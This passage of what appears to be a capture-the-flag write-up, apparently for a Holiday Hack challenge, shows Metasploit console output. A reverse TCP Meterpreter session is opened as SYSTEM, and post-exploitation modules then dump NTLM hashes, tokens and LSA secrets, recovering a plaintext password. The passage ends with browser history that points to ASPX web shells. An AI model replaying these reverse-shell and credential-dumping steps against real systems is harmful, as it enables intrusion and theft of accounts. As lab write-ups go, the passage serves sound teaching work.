+resource (msf_payloads/windows-meterpreter-stageless-reverse-tcp-4445-exe.rc)> run -j
+[*] Exploit running as background job 0.
+Meterpreter session 1 opened (1.2.3.4:4445 -> 35.185.57.190:49672) at 2018-01-09 05:08:43 +0000
+msf exploit(handler) > sessions
+
+Active sessions
+===============
+
+  Id  Name  Type                     Information                            Connection
+  --  ----  ----                     -----------                            ----------
+  1         meterpreter x64/windows  NT AUTHORITY\SYSTEM @ HHC17-SMB-SERVE  1.2.3.4:4445 -> 35.185.57.190:49756 (10.142.0.8)
+#+END_SRC
+
+And now, we've managed to elevate our credentials. There are a few
+"post-exploitation" modules for Meterpreter, which will use our
+session. For instance, let's dump the hashes on the system:
+
+#+BEGIN_SRC 
+msf exploit(handler) > set -g SESSION 1
+SESSION => 1
+msf exploit(handler) > use post/windows/gather/credentials/credential_collector
+msf post(credential_collector) > run
+
+[*] Running module against HHC17-SMB-SERVE
+[+] Collecting hashes...
+    Extracted: Administrator:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
+    Extracted: alabaster_snowball:aad3b435b51404eeaad3b435b51404ee:10e2fa00c44d10ca05d399f47ed13351
+    Extracted: DefaultAccount:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
+    Extracted: Guest:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
+    Extracted: sysadmin:aad3b435b51404eeaad3b435b51404ee:27309e9a73764938860b4a1ed7c0392b
+[+] Collecting tokens...
+    HHC17-SMB-SERVE\alabaster_snowball
+    IIS APPPOOL\DefaultAppPool
+    NT AUTHORITY\IUSR
+    NT AUTHORITY\LOCAL SERVICE
+    NT AUTHORITY\NETWORK SERVICE
+    NT AUTHORITY\SYSTEM
+    Window Manager\DWM-1
+    NT AUTHORITY\ANONYMOUS LOGON
+[*] Post module execution completed
+#+END_SRC
+
+We could try to crack some hashes, but there's an easier way. Let's check the LSA secrets:
+
+#+BEGIN_SRC 
+msf post(credential_collector) > use post/windows/gather/lsa_secrets
+msf post(lsa_secrets) > info
+
+       Name: Windows Enumerate LSA Secrets
+     Module: post/windows/gather/lsa_secrets
+   Platform: Windows
+       Arch:
+       Rank: Normal
+
+Provided by:
+  Rob Bathurst <rob.bathurst@foundstone.com>
+
+Compatible session types:
+  Meterpreter
+
+Basic options:
+  Name     Current Setting  Required  Description
+  ----     ---------------  --------  -----------
+  SESSION  1                yes       The session to run this module on.
+
+Description:
+  This module will attempt to enumerate the LSA Secrets keys within
+  the registry. The registry value used is:
+  HKEY_LOCAL_MACHINE\Security\Policy\Secrets\. Thanks goes to Maurizio
+  Agazzini and Mubix for decrypt code from cachedump.
+
+msf post(lsa_secrets) > run
+
+[*] Executing module against HHC17-SMB-SERVE
+[*] Obtaining boot key...
+[*] Obtaining Lsa key...
+[*] Vista or above system
+[+] Key: DPAPI_SYSTEM
+ Decrypted Value: ,2#B@:o~NY*#(1]`Vx
+
+[+] Key: NL$KM
+ Decrypted Value: @.tUb#=VQc_Y%&P1`gG;g1p0I)me& }Z/zXP`
+
+[+] Key: _SC_agrabber
+ Username: .\alabaster_snowball
+ Decrypted Value: .Carried_mass_it_reader1
+
+[*] Writing to loot...
+[*] Data saved in: /home/vladg/.msf4/loot/20180109050031_default_10.142.0.8_registry.lsa.sec_967944.txt
+[*] Post module execution completed
+#+END_SRC
+
+We can verify this with our hash, or via RDP: alabaster's password is
+=Carried_mass_it_reader1=, which matches what we got before.
+
+At this point, the system is pretty well compromised. We were unable to crack the sysadmin user's hash, or pivot from this system to other systems using our privileged access.
+
+We did, however, find some neat things in the Firefox browsing history of the sysadmin user:
+
+#+BEGIN_SRC 
+'https://www.python.org/downloads/release/python-362/'
+'https://www.google.com/search?q=non+sucky+servaice+manager&ie=utf-8&oe=utf-8&client=firefox-b-1-ab'
+'https://nssm.cc/release/nssm-2.24.zip'
+'http://localhost/'
+'https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/asp/cmd.aspx'
+'http://localhost/test.aspx'
+'https://stackoverflow.com/questions/4388066/the-page-you-are-requesting-cannot-be-served-because-of-the-extension-configura'
+'https://www.google.com/search?q=how+to+use+aspnet_regiis&ie=utf-8&oe=utf-8&client=firefox-b-1-ab'
+'https://www.google.com/search?q=aspnet_regiis+%3A+The+term+%27aspnet_regiis%27+is+not+recognized+as+the+name+of+a+cmdlet&ie=utf-8&oe=utf-8&client=firefox-b-1-ab'
+'http://exescan.net/exes/a/aspnet_regiis-exe-file'
+'https://www.google.com/search?q=how+to+configure+asp+to+run+on+iis&ie=utf-8&oe=utf-8&client=firefox-b-1-ab'
+'https://docs.microsoft.com/en-us/iis/application-frameworks/scenario-build-an-aspnet-website-on-iis/configuring-step-1-install-iis-and-asp-net-modules'
+'https://www.google.com/search?q=enable+asp+on+windows+2016&ie=utf-8&oe=utf-8&client=firefox-b-1-ab'
+'https://docs.microsoft.com/en-us/biztalk/core/how-to-enable-asp-net-4-0-for-published-web-services'
+'https://az764295.vo.msecnd.net/stable/dcee2202709a4f223185514b9275aa4229841aa7/VSCodeSetup-x64-1.18.0.exe'
+'http://127.0.0.1/'
+'http://127.0.0.1/evil.aspx'
+'http://localhost/cmd.aspx'
+'http://localhost/jerry.aspx'
+'http://localhost/ok.txt'
+#+END_SRC
